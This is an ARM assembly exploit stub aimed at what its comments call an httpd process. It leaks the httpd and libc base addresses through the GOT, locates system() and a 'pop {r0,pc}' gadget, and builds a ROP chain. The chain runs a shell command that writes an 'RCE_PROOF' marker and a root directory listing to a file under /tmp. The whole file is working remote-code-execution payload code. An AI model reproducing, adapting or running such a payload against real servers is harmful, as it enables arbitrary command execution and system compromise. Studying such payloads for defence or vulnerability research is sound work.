.syntax unified
.arm
.text
.global _stub
_stub:
    push    {r4-r9, sl, fp, lr}
    adr     r4, _stub
    ldr     r5, =0x12770
    sub     r4, r4, r5            @ httpd base
    ldr     r9, =0x15aa8          @ malloc@PLT
    add     r9, r4, r9
    mov     r0, #16
    blx     r9                    @ resolve GOT
    ldr     r6, =0xeace0
    add     r6, r4, r6
    ldr     r6, [r6]              @ libc malloc
    ldr     r7, =0x48278
    sub     r6, r6, r7            @ libc base
    ldr     r7, =0x50b84
    add     r7, r6, r7            @ system
    add     fp, sp, #32
    @ ROP chain around pop-source (sp will be fp-32)
    mov     r8, fp
    sub     r8, r8, #0x20         @ r8 = fp-32
    mov     r9, #0x41
    str     r9, [r8, #0]
    str     r9, [r8, #4]
    str     r9, [r8, #8]
    str     r9, [r8, #12]
    str     r9, [r8, #16]
    str     r9, [r8, #20]
    str     r9, [r8, #24]
    str     r9, [r8, #28]
    ldr     r9, =0x33ad0
    add     r9, r6, r9            @ pop {r0,pc}
    str     r9, [fp, #0]          @ -> PC
    adr     r9, _cmdstr
    str     r9, [fp, #4]          @ -> r0
    str     r7, [fp, #8]          @ -> PC (system)
    mov     sp, fp
    sub     sp, sp, #0x20
    pop     {r4-r9, sl, fp, pc}
_cmdstr:
    .asciz "sh -c 'echo RCE_PROOF_$(date +%s); ls /' > /tmp/z/shell_out.txt"
